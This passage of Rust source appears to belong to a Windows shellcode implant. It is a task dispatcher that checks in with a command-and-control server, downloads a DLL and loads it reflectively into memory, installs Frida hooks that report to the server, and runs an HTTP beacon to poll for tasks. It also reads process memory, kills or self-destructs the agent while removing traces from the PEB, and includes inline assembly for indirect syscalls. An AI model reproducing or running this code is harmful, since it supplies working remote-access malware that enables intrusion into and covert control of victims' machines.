                let script_str = script_str.trim_end_matches('\0');

                // Get optional hook name
                let hook_name = if let Some(name_arg) = name {
                    let name_expanded = resolve_arg(&name_arg, &vars, &constants);
                    let name_str = String::from_utf8_lossy(&name_expanded);
                    let name_str = name_str.trim_end_matches('\0');
                    if !name_str.is_empty() {
                        Some(name_str.to_string())
                    } else {
                        None
                    }
                } else {
                    None
                };

                // Set HTTP callback if provided
                if let Some(host_arg) = callback_host {
                    let host_expanded = resolve_arg(&host_arg, &vars, &constants);
                    let host_str = String::from_utf8_lossy(&host_expanded);
                    let host_str = host_str.trim_end_matches('\0');

                    let port_val = if let Some(port_arg) = callback_port {
                        let port_expanded = resolve_arg(&port_arg, &vars, &constants);
                        if port_expanded.len() >= 2 {
                            (port_expanded[0] as u16) | ((port_expanded[1] as u16) << 8)
                        } else if port_expanded.len() == 1 {
                            port_expanded[0] as u16
                        } else {
                            80
                        }
                    } else {
                        80
                    };

                    if !host_str.is_empty() {
                        frida::set_http_callback(host_str, port_val);

                        // Check in to get GUID if we don't have one
                        let inst = get_instance().unwrap();
                        if inst.c2_guid.is_none() {
                            let json = c2::build_checkin_json(5000, None);

                            // Try to check in
                            if let Ok(mut client) = HttpClient::new() {
                                client.headers = Some(String::from("Content-Type: application/json\r\n"));
                                if let Ok(response) = client.send("POST", host_str, port_val, "/checkin", false, Some(&json)) {
                                    if !response.is_empty() {
                                        let lossy = String::from_utf8_lossy(&response);
                                        let trimmed = lossy.trim_end_matches('\0');
                                        if !trimmed.is_empty() {
                                            inst.c2_guid = Some(String::from(trimmed));
                                            #[cfg(feature = "debug")]
                                            libs::utils::write_output(b"[frida] checked in\n");
                                        }
                                    }
                                }
                            }
                        }
                    }
                }

                // Check if DLL already loaded
                let instance = get_instance().unwrap();
                if !instance.frida.is_loaded() {
                    // Parse URL and download DLL
                    let secure = url_str.starts_with("https://");
                    let mut port: u16 = if secure { 443 } else { 80 };
                    let (mut host, path) = split_url(url_str);
                    if let Some(idx) = host.find(':') {
                        if let Ok(p) = host[idx + 1..].parse::<u16>() {
                            port = p;
                        }
                        host = host[..idx].to_string();
                    }

                    let client = match HttpClient::new() {
                        Ok(c) => c,
                        Err(e) => {
                            last_result = result_err(e, &[]);
                            idx = next_idx;
                            continue;
                        }
                    };

                    let dll_data = match client.send("GET", &host, port, &path, secure, None) {
                        Ok(d) => d,
                        Err(e) => {
                            last_result = result_err(e, &[]);
                            idx = next_idx;
                            continue;
                        }
                    };

                    // Reflectively load the DLL
                    let dll_name = url_str.to_string();
                    let dll_base = match inject::reflective_load_dll_named(&dll_name, &dll_data) {
                        Ok(b) => b,
                        Err(e) => {
                            last_result = result_err(e, &[]);
                            idx = next_idx;
                            continue;
                        }
                    };

                    // Initialize Frida from the loaded DLL
                    if let Err(e) = frida::init_frida_from_dll(dll_base) {
                        last_result = result_err(e, &[]);
                        idx = next_idx;
                        continue;
                    }
                }

                // Parse optional batch_size (u32 LE, default 50)
                let batch_val = if let Some(bs_arg) = batch_size {
                    let bs_expanded = resolve_arg(&bs_arg, &vars, &constants);
                    if bs_expanded.len() >= 4 {
                        u32::from_le_bytes([bs_expanded[0], bs_expanded[1], bs_expanded[2], bs_expanded[3]])
                    } else {
                        50
                    }
                } else {
                    50
                };

                // Parse optional flush_interval (u32 LE, default 5000)
                let flush_val = if let Some(fi_arg) = flush_interval {
                    let fi_expanded = resolve_arg(&fi_arg, &vars, &constants);
                    if fi_expanded.len() >= 4 {
                        u32::from_le_bytes([fi_expanded[0], fi_expanded[1], fi_expanded[2], fi_expanded[3]])
                    } else {
                        5000
                    }
                } else {
                    5000
                };

                // Install the hook
                if !script_str.is_empty() {
                    match frida::install_hook(script_str, hook_name.as_deref(), batch_val, flush_val as u64) {
                        Ok(dll_hook_id) => {
                            // Register hook with server to get a hook UUID
                            let inst = get_instance().unwrap();
                            if !inst.frida.callback_host.is_empty() && inst.frida.callback_port > 0 {
                                if let Some(ref guid) = inst.c2_guid {
                                    let mut body = String::from("{\"implant_id\":\"");
                                    body.push_str(guid);
                                    body.push_str("\",\"name\":\"");
                                    body.push_str(hook_name.as_deref().unwrap_or("unnamed"));
                                    body.push_str("\"}");

                                    if let Ok(mut client) = HttpClient::new() {
                                        client.headers = Some(String::from("Content-Type: application/json\r\n"));
                                        let host = inst.frida.callback_host.clone();
                                        let port = inst.frida.callback_port;
                                        if let Ok(response) = client.send("POST", &host, port, "/hooks", false, Some(&body)) {
                                            if !response.is_empty() {
                                                let lossy = String::from_utf8_lossy(&response);
                                                let server_hook_id = lossy.trim_end_matches('\0');
                                                if !server_hook_id.is_empty() {
                                                    frida::set_hook_server_id(dll_hook_id, server_hook_id);
                                                }
                                            }
                                        }
                                    }
                                }
                            }

                            let mut msg = b"hook installed: ".to_vec();
                            msg.extend_from_slice(libs::utils::int_to_str(dll_hook_id as u32).as_bytes());
                            last_result = result_ok(msg);
                        }
                        Err(e) => {
                            #[cfg(feature = "debug")]
                            {
                                let msg = libs::utils::format_error(e);
                                if !msg.is_empty() {
                                    libs::utils::write_output(&msg);
                                }
                            }
                            last_result = result_err(e, &[]);
                        }
                    }
                } else {
                    last_result = result_ok(b"frida ready".to_vec());
                }
            }

            // 0x40 - Frida Unhook: unload hook(s) by ID, name, or all
            #[cfg(feature = "frida")]
            Task::FridaUnhook { hook_id, name } => {
                use libs::frida;

                // Parse hook_id if provided
                let id_opt = if let Some(ref id_arg) = hook_id {
                    let id_expanded = resolve_arg(id_arg, &vars, &constants);
                    if !id_expanded.is_empty() {
                        let id_val = if id_expanded.len() >= 4 {
                            i32::from_le_bytes([id_expanded[0], id_expanded[1], id_expanded[2], id_expanded[3]])
                        } else if id_expanded.len() >= 2 {
                            i16::from_le_bytes([id_expanded[0], id_expanded[1]]) as i32
                        } else {
                            id_expanded[0] as i32
                        };
                        Some(id_val)
                    } else {
                        None
                    }
                } else {
                    None
                };

                // Parse name if provided
                let name_opt = if let Some(ref name_arg) = name {
                    let name_expanded = resolve_arg(name_arg, &vars, &constants);
                    let name_str = String::from_utf8_lossy(&name_expanded);
                    let name_str = name_str.trim_end_matches('\0');
                    if !name_str.is_empty() {
                        Some(name_str.to_string())
                    } else {
                        None
                    }
                } else {
                    None
                };

                // Collect server hook_ids before unloading (unload removes them)
                let server_ids = frida::get_hook_server_ids(id_opt, name_opt.as_deref());

                match frida::unload_hook(id_opt, name_opt.as_deref()) {
                    Ok(count) => {
                        // Notify server about unloaded hooks
                        let inst = get_instance().unwrap();
                        if !inst.frida.callback_host.is_empty() && inst.frida.callback_port > 0 {
                            let host = inst.frida.callback_host.clone();
                            let port = inst.frida.callback_port;
                            for sid in &server_ids {
                                if let Ok(client) = libs::winhttp::HttpClient::new() {
                                    let mut path = String::from("/hooks/");
                                    path.push_str(sid);
                                    path.push_str("/unload");
                                    let _ = client.send("POST", &host, port, &path, false, None);
                                }
                            }
                        }

                        let mut msg = b"unloaded ".to_vec();
                        msg.extend_from_slice(libs::utils::int_to_str(count).as_bytes());
                        msg.extend_from_slice(b" hook(s)");
                        last_result = result_ok(msg);
                    }
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            // 0x42 - Kill agent (self or by magic)
            Task::Kill { magic } => {
                match magic {
                    Some(magic_arg) => {
                        // Kill another agent by magic
                        let magic_expanded = resolve_arg(magic_arg, &vars, &constants);
                        let target_magic = if magic_expanded.len() >= 4 {
                            u32::from_le_bytes([
                                magic_expanded[0],
                                magic_expanded[1],
                                magic_expanded[2],
                                magic_expanded[3],
                            ])
                        } else {
                            last_result = result_err(0x80070057u32, b"invalid magic");
                            continue;
                        };

                        match kill_agent_by_magic(target_magic) {
                            Ok(()) => last_result = result_ok(b"agent killed".to_vec()),
                            Err(e) => {
                                #[cfg(feature = "debug")]
                                {
                                    let msg = libs::utils::format_error(e);
                                    if !msg.is_empty() {
                                        libs::utils::write_output(&msg);
                                    }
                                }
                                last_result = result_err(e, &[]);
                            }
                        }
                    }
                    None => {
                        // Self-destruct - call the destroy() function which cleans up
                        // allocations and removes us from PEB, then terminate thread
                        if let Some(inst) = get_instance() {
                            let thread_handle = inst.thread_handle;
                            let terminate_fn = inst.k32.terminate_thread;
                            destroy(); // Clean up allocations and remove from PEB
                            terminate_fn(thread_handle, 0);
                        }
                        // Won't reach here
                    }
                }
            }

            // 0x43 - HTTP Beacon: poll server for tasks, post results
            #[cfg(feature = "c2")]
            Task::HttpBeacon { host, port, interval, secure, agent_id } => {
                let host_expanded = resolve_arg(host, &vars, &constants);
                let host_str = String::from_utf8_lossy(&host_expanded);
                let host_str = host_str.trim_end_matches('\0');

                let port_expanded = resolve_arg(port, &vars, &constants);
                let port_val = if port_expanded.len() >= 2 {
                    u16::from_le_bytes([port_expanded[0], port_expanded[1]])
                } else if port_expanded.len() == 1 {
                    port_expanded[0] as u16
                } else {
                    80 // default port
                };

                let interval_expanded = resolve_arg(interval, &vars, &constants);
                let interval_val = if interval_expanded.len() >= 4 {
                    u32::from_le_bytes([
                        interval_expanded[0],
                        interval_expanded[1],
                        interval_expanded[2],
                        interval_expanded[3],
                    ])
                } else {
                    5000 // default 5 seconds
                };

                let secure_val = if let Some(sec_arg) = secure {
                    let sec_expanded = resolve_arg(&sec_arg, &vars, &constants);
                    !sec_expanded.is_empty() && sec_expanded[0] != 0
                } else {
                    false
                };

                let agent_id_val = if let Some(aid_arg) = agent_id {
                    let aid_expanded = resolve_arg(&aid_arg, &vars, &constants);
                    let aid_str = String::from_utf8_lossy(&aid_expanded);
                    let aid_str = aid_str.trim_end_matches('\0');
                    if aid_str.is_empty() { None } else { Some(String::from(aid_str)) }
                } else {
                    None
                };

                match c2::run_http_beacon(host_str, port_val, interval_val, secure_val, agent_id_val.as_deref()) {
                    Ok(()) => last_result = result_ok(b"beacon ended".to_vec()),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            // 0x44 - Read memory at address (address is hex string, size is LE bytes, optional pid)
            Task::MemRead { address, size, pid } => {
                let addr_expanded = resolve_arg(address, &vars, &constants);
                let size_expanded = resolve_arg(size, &vars, &constants);

                // Parse address as hex string e.g. "DEADBEEFDEADBEEF"
                let addr_str = String::from_utf8_lossy(&addr_expanded);
                let addr_str = addr_str.trim_end_matches('\0');
                let addr: usize = match parse_hex_addr(addr_str.as_bytes()) {
                    Some(a) => a,
                    None => {
                        last_result = result_err(0x80070057u32, b"invalid address");
                        continue;
                    }
                };

                let read_size: usize = if size_expanded.len() >= 4 {
                    u32::from_le_bytes([
                        size_expanded[0], size_expanded[1], size_expanded[2], size_expanded[3],
                    ]) as usize
                } else if size_expanded.len() >= 2 {
                    u16::from_le_bytes([size_expanded[0], size_expanded[1]]) as usize
                } else if !size_expanded.is_empty() {
                    size_expanded[0] as usize
                } else {
                    last_result = result_err(0x80070057u32, b"invalid size");
                    continue;
                };

                let pid_val = pid.as_ref().map(|p| {
                    let p_expanded = resolve_arg(p, &vars, &constants);
                    mem::parse_pid(&p_expanded)
                }).flatten();

                match mem::mem_read(addr, read_size, pid_val) {
                    Ok(data) => last_result = result_ok(data),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            // 0x45 - List loaded DLLs from PEB LDR
            #[cfg(feature = "mal")]
            Task::DllList { pid } => {
                let pid_val = pid.as_ref().map(|p| {
                    let p_expanded = resolve_arg(p, &vars, &constants);
                    mem::parse_pid(&p_expanded)
                }).flatten();

                let result = if pid_val == Some(mem::ALL_PIDS) {
                    mem::dll_list_all()
                } else {
                    mem::dll_list(pid_val)
                };
                match result {
                    Ok(data) => last_result = result_ok(data),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            // 0x46 - Enumerate virtual memory regions
            #[cfg(feature = "mal")]
            Task::MemMap { pid } => {
                let pid_val = pid.as_ref().map(|p| {
                    let p_expanded = resolve_arg(p, &vars, &constants);
                    mem::parse_pid(&p_expanded)
                }).flatten();

                let result = if pid_val == Some(mem::ALL_PIDS) {
                    mem::mem_map_all()
                } else {
                    mem::mem_map(pid_val)
                };
                match result {
                    Ok(data) => last_result = result_ok(data),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            // 0x47 - Find executable private memory (injected code)
            #[cfg(feature = "mal")]
            Task::Malfind { pid } => {
                let pid_val = pid.as_ref().map(|p| {
                    let p_expanded = resolve_arg(p, &vars, &constants);
                    mem::parse_pid(&p_expanded)
                }).flatten();

                let result = if pid_val == Some(mem::ALL_PIDS) {
                    mem::malfind_all()
                } else {
                    mem::malfind(pid_val)
                };
                match result {
                    Ok(data) => last_result = result_ok(data),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }

            // 0x48 - Cross-reference IMAGE regions against PEB module lists
            #[cfg(feature = "mal")]
            Task::LdrCheck { pid } => {
                let pid_val = pid.as_ref().map(|p| {
                    let p_expanded = resolve_arg(p, &vars, &constants);
                    mem::parse_pid(&p_expanded)
                }).flatten();

                let result = if pid_val == Some(mem::ALL_PIDS) {
                    mem::ldr_check_all()
                } else {
                    mem::ldr_check(pid_val)
                };
                match result {
                    Ok(data) => last_result = result_ok(data),
                    Err(e) => {
                        #[cfg(feature = "debug")]
                        {
                            let msg = libs::utils::format_error(e);
                            if !msg.is_empty() {
                                libs::utils::write_output(&msg);
                            }
                        }
                        last_result = result_err(e, &[]);
                    }
                }
            }
        }

        // If in C2 mode, accumulate this task's result
        if let Some(inst) = get_instance() {
            if let Some(ref mut buf) = inst.results_buffer {
                buf.extend_from_slice(&(last_result.len() as u32).to_le_bytes());
                buf.extend_from_slice(&last_result);
            }
        }

        idx = next_idx;
    }

    last_result
}

/// Initializes system modules and functions, and then starts a reverse shell.
unsafe fn main() {
    init_ntdll_funcs();
    init_kernel32_funcs();
    #[cfg(feature = "network")]
    init_winsock_funcs();
    init_advapi32_funcs();
    #[cfg(feature = "network")]
    init_winhttp_funcs();
    #[cfg(feature = "ad")]
    init_ldap32_funcs();
    //init_frida_funcs();
    #[cfg(feature = "execution")]
    init_ole32_funcs();

    // Store our thread handle for kill opcode
    // Need to duplicate because GetCurrentThread returns a pseudo-handle
    if let Some(inst) = get_instance() {
        let pseudo_handle = (inst.k32.get_current_thread)();
        let current_process = (inst.k32.get_current_process)();
        let mut real_handle: *mut c_void = core::ptr::null_mut();
        (inst.k32.duplicate_handle)(
            current_process,
            pseudo_handle,
            current_process,
            &mut real_handle,
            0,           // DUPLICATE_SAME_ACCESS via dwOptions
            0,           // bInheritHandle
            0x2,         // DUPLICATE_SAME_ACCESS
        );
        inst.thread_handle = real_handle;
    }

    // Execute bytecode sequence - task ID is looked up in jump table
    execute_sequence();

}

global_asm!(
    r#"
.globl _start
.globl isyscall

.section .text

_start:
    push  rsi
    mov   rsi, rsp
    and   rsp, 0xFFFFFFFFFFFFFFF0
    sub   rsp, 0x20
    call  initialize
    call  destroy
    mov   rsp, rsi
    pop   rsi
    ret

isyscall:
    mov [rsp - 0x8],  rsi
    mov [rsp - 0x10], rdi
    mov [rsp - 0x18], r12

    xor r10, r10			
    mov rax, rcx			
    mov r10, rax

    mov eax, ecx

    mov r12, rdx
    mov rcx, r8

    mov r10, r9
    mov rdx,  [rsp + 0x28]
    mov r8,   [rsp + 0x30]
    mov r9,   [rsp + 0x38]

    sub rcx, 0x4
    jle skip

    lea rsi,  [rsp + 0x40]
    lea rdi,  [rsp + 0x28]

    rep movsq
skip:
    mov rcx, r12

    mov rsi, [rsp - 0x8]
    mov rdi, [rsp - 0x10]
    mov r12, [rsp - 0x18]

    jmp rcx

"#
);

extern "C" {
    fn _start();
    static shellcode_end: u8;
}

/// Attempts to locate the global `Instance` by scanning process heaps and
/// returns a mutable reference to it if found.
unsafe fn get_instance() -> Option<&'static mut Instance> {
    let peb: *mut libs::ntdef::PEB = find_peb(); // Locate the PEB (Process Environment Block)
    let process_heaps = (*peb).process_heaps;
    let number_of_heaps = (*peb).number_of_heaps as usize;

    for i in 0..number_of_heaps {
        let heap = *process_heaps.add(i);
        if !heap.is_null() {
            let instance = &mut *(heap as *mut Instance);
            //if instance.magic == _start as usize {
            if instance.magic == libs::utils::get_magic() {
                return Some(instance); // Return the instance if the magic value matches
            }
        }
    }
    None
}

// The compiler seems to make 2 values. One to satisfy the linker and one to use deeper in .text.
// so we need to dereference this address when we want to get the task
#[link_section = ".end"]
#[used]
static MAGIC: u32 = 0x17171717;
#[link_section = ".end"]
#[used]
static TASK: u8 = 0xDE;
